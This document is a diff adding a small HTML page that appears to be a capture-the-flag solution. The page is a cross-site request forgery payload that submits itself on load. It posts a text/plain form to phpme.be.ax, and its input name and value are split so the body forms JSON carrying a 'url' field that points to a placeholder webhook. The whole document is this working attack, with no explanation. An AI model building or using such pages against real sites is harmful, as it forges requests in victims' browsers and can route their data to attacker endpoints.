@@ -1,0 +1,10 @@
+<html>
+  <body>
+    <form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
+      <input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
+    </form>
+    <script>
+        form.submit();
+    </script>
+  </body>
+</html>
